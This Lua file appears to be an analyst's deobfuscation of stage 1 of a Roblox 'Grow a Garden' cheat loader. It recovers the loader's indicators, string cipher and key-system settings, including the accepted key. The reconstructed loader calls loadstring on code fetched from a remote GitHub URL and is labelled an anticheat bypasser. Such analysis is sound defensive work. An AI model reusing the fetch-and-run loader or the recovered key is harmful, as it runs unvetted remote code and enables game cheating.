--[[ ===========================================================================
  DEOBFUSCATION / RECONSTRUCTION  —  STAGE 1 of 2  (the loader)
  ---------------------------------------------------------------------------
  Source  : https://raw.githubusercontent.com/Brunfua/sickheads/refs/heads/main/loadergag.txt
  Obfusc. : "wearedevs.net/obfuscator" v1.0.0  (same VM/control-flow-flattening
             engine as the ezvbs sample; only the variable names, the custom
             base64 alphabet and the stream-cipher constants differ).

  This stage is a Rayfield-UI **key-system loader** for a Roblox "Grow a Garden"
  cheat.  It is gated behind a link-shortener (monetisation) and, once a valid
  key is entered, downloads + runs stage 2 (the actual Seed/Pet spawner).

  RECOVERED INDICATORS (decrypted from the embedded blobs):
      Author        : Nozrakk  ("by Nozrakk", folder/file "PeterHack")
      Key link      : https://bstshrt.com/nozrakk/ck1        (bstshrt = paid link-shortener)
      Valid-key src : https://pastebin.com/raw/tnBqbcZM
                        -> contents (the accepted key): ssasdnsjdnsajnsadjndsajndjndsajnajsndnjsdajnas
      Stage-2 payload: https://raw.githubusercontent.com/Nozrakk/sszz/refs/heads/main/zz
      Clipboard msg : "Key copied to clipboard!"

  Cipher used for the embedded strings (reconstructed; verified):
      45-bit LCG  state = (state*17 + 33994022075859) mod 2^45
      companion   m     = (m*245) mod 257
      keystream   = ror32( floor(state / 2^(13-floor(m/32))) mod 2^32 , m mod 32 )
                    emitted big-endian, 4 bytes at a time
      plaintext[i]= (cipher[i] + keystream[i] + carry) mod 256 ; carry0 = 131
      (seeds: LCG = key mod 2^45 ; companion = (key mod 255)+2)
=========================================================================== ]]


--==========================================================================
--  EQUIVALENT CLEAN LOADER  (Rayfield key-system; reconstructed from the VM)
--==========================================================================
-- The decrypted constants are exactly the field names of a Rayfield
-- CreateWindow{...} call with KeySystem enabled, plus a single "Load script"
-- button whose callback fetches and runs stage 2.

local Rayfield = ...  -- the Rayfield UI library object the script drives
                      -- (CreateWindow / CreateTab / CreateButton)

local Window = Rayfield:CreateWindow({
    Name               = "Grow A Garden anticheat bypasser",
    Icon               = 0,
    LoadingTitle       = "Grow a garden anticheat bypasser",   -- "by Nozrakk"
    LoadingSubtitle    = "by Nozrakk",
    ConfigurationSaving = {
        Enabled  = true,
        FolderName = "PeterHack",
        FileName = "Bypasser",
    },
    Discord = {
        Enabled       = false,            -- "noinvitelink"
        Invite        = "noinvitelink",
        RememberJoins = true,
    },
    KeySystem  = true,
    KeySettings = {
        Title    = "Bypasser",
        Subtitle = "KeySystem",
        Note     = "visit this link for the key: https://bstshrt.com/nozrakk/ck1",
        FileName = "Bypassing",
        SaveKey  = true,
        GrabKeyFromSite = true,
        -- valid keys are pulled from this paste (current value: the one key below)
        Key = { "https://pastebin.com/raw/tnBqbcZM" },
        --  -> https://pastebin.com/raw/tnBqbcZM contains:
        --        ssasdnsjdnsajnsadjndsajndjndsajnajsndnjsdajnas
    },
})

-- A small helper offered to the user: copy the key link to the clipboard.
-- (setclipboard("https://bstshrt.com/nozrakk/ck1"); notify "Key copied to clipboard!")
setclipboard("https://bstshrt.com/nozrakk/ck1")   -- -> "Key copied to clipboard!"

local Tab = Window:CreateTab("Bypasser", 0)

Tab:CreateButton({
    Name = "Load script",
    Callback = function()
        -- Stage 2: download and execute the Seed/Pet spawner.
        loadstring(game:HttpGetAsync(
            "https://raw.githubusercontent.com/Nozrakk/sszz/refs/heads/main/zz"
        ))()
    end,
})

--==========================================================================
--  ANTI-TAMPER  (same scheme as the ezvbs sample)
--==========================================================================
-- Before any of the above runs, the VM:
--   * captures math.floor / math.random / string.* / table.* up-front,
--   * builds a random nonce (math.random 1..100 / 0..255 / 1..10000) and
--     extracts digits via string.gmatch(tostring(x), ":(%d*):"),
--   * wraps a probe in pcall and compares identity/address strings; if a hook
--     or debug shim is detected it calls  error("Tamper Detected!")  and aborts.
